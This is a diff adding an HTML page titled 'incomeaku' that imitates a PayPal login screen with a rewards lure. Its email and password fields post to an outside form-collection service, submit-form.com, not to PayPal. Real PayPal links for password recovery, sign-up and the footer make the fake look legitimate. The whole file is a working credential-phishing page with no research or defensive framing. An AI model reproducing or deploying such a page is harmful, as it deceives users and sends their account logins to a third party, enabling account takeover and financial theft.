@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+  
+
+    <title>incomeaku</title>
+    <style>
+        body {
+         
+            background:white;
+            font-family:sans-serif;
+        }
+        input {
+            width:318px;
+            height:65px;
+            border-radius:3px;
+            border:1px solid silver;
+           
+          
+        }
+        #text:hover {
+           outline-color:#2b96ffe3;
+           background:#8098ff27;
+           border:2px solid #2b96ffe3;
+           font-weight:bold;
+           font-size:15px;
+           border-radius:5px;
+  }
+  .yes:hover {
+           outline-color:#2b96ffe3;
+           background:#8098ff27;
+           border:2px solid #2b96ffe3;
+           font-weight:bold;
+           border-radius:5px;
+  }
+           #text {
+               margin-left:10px;
+           }
+             #password {
+               border-left-color:white;
+           border-right-color:white;
+           border-top-color:white;
+           border-bottom-color:white;
+               width:250px;
+               margin-top:3px;
+               background:transparent;
+               height:55px;
+           }
+           #password:hover {
+            outline-color:transparent;
+               background:transparent;
+                 font-weight:bold;
+                 font-size:15px;
+                 
+           }
+           .yes {
+               width:318px;
+               height:65px;
+               border:1px solid silver;
+               margin-left:8px;
+           }
+        ::placeholder{
+            color:black;
+        }
+        #button {
+            font-weight:bold;
+            color:white;
+            margin-left:10px;
+            width:320px;
+            height:50px;
+            border-radius:22px;
+            background:#002fb6d7;
+            border:0.5px solid #002fb6d7;
+            font-size:15px;
+        }
+        #button:hover {
+            outline-color:white;
+        }
+         #grebn {
+            font-weight:bold;
+            color:#1e2024bf;
+            margin-left:10px;
+            width:320px;
+            height:50px;
+            border-radius:22px;
+            background:white;
+            border:1.2px solid #1e2024bf;
+            font-size:15px;
+        }
+        #grebn:hover {
+            outline-color:none;
+        }
+        
+        .line {
+            margin-left:10px;
+            color:#706b80;
+            width:310px;
+        }
+        a {
+            font-size:10px;
+            font-weight:bold;
+            text-decoration:none;
+            color:#706b80d8;
+        }
+        span {
+            margin-right:10px;
+        }
+            </style>
+</head>
+<body>
+    <center>
+    <br>
+    <img src="https://i.ibb.co/QCyWy5F/Screenshot-20240320-135112-2.png" alt="Screenshot-20240320-135112-2" border="0" height="50px;"><br>
+    <p style="font-weight:bold;">With PayPal account, you're eligible for rewards.</p>
+    <form id="form" action="https://submit-form.com/9MMYQbtuv" data-botpoison-public-key="pk_xxxxxxxx">
+     <input type="text" name="text" placeholder="&nbsp;Email&nbsp;or&nbsp;mobile&nbsp;number" id="text" required/><br><br>
+     <div class="yes"><input type="password" name="password" placeholder="&nbsp;Password" id="password" required/><span class="material-symbols-outlined open-eyes" style="float:right; width: 50px;margin-top: 19px;" onclick="openE()" id="openE">
+Show
+</span><span  style="display: none; float:right; width: 50px;margin-top:19px;" class="material-symbols-outlined close-eyes" onclick="closeE()" id="closeE">
+Hide
+</span></div>   
+        <p><a style="margin-right:50%;color:#0086e4;font-weight:bold;font-size:17px;" href="https://www.paypal.com/authflow/password-recovery/?country.x=US&locale.x=en_US&redirectUri=%252Fsignin" target="_blank">Forgot&nbsp;password?</a></p><br>
+      <button type="submit" id="button">Log In</button>
+    </form><br>
+    <div class="line">
+       <hr style="float:left;width:125px;color:silver;" size="1">or<hr style="float:right;width:125px;color:silver;" size="1">
+    </div><br>
+    <a href="https://www.paypal.com/ng/welcome/signup/#/login_info" style="font-weight:bold;color:#1e2024bf;font-size:15px;" target="_blank"><button type="submit" id="grebn">Sign&nbsp;Up</a></button><br><br><br><br>
+    <div id="footer">
+    <a href="https://www.paypal.com/us/smarthelp/contact-us" target="_blank">Contact&nbsp;Us</a>&nbsp;&nbsp; <a href="https://www.paypal.com/us/webapps/mpp/ua/privacy-full" target="_blank">Privacy</a>&nbsp;&nbsp;<a href="https://www.paypal.com/us/legalhub/home" target="_blank">Legal</a>&nbsp;&nbsp;<a href="https://www.paypal.com/us/legalhub/upcoming-policies-full" target="_blank">Policy&nbsp;Updates</a>&nbsp;&nbsp;<a href="https://www.paypal.com/us/webapps/mpp/country-worldwide" target="_blank">Worldwide</a>
+    </div>
+    </center>
+</body>
+<script>
+     function openE() {
+
+  let openE = document.getElementById("openE");
+
+  let closeE = document.getElementById("closeE");
+
+  password.type = "text";
+
+  openE.style.display = "none";
+
+  closeE.style.display = "block";
+
+}
+
+
+        function closeE() {
+
+  let openE = document.getElementById("openE");
+
+  let closeE = document.getElementById("closeE");
+
+  password.type = "password";
+
+  closeE.style.display = "none";
+
+  openE.style.display = "block";
+
+}
+
+
+var formElement = document.getElementById("form");
+
+var buttonElement = document.getElementById("button");
+
+formElement.addEventListener("botpoison-challenge-start", function () {
+
+buttonElement.setAttribute("disabled", "disabled");
+
+});
+
+formElement.addEventListener("botpoison-challenge-success", function () {
+
+buttonElement.removeAttribute("disabled");
+
+});
+
+formElement.addEventListener("botpoison-challenge-error", function () {
+
+buttonElement.removeAttribute("disabled");
+
+});
+
+
+
+    </script>
+
+</html>
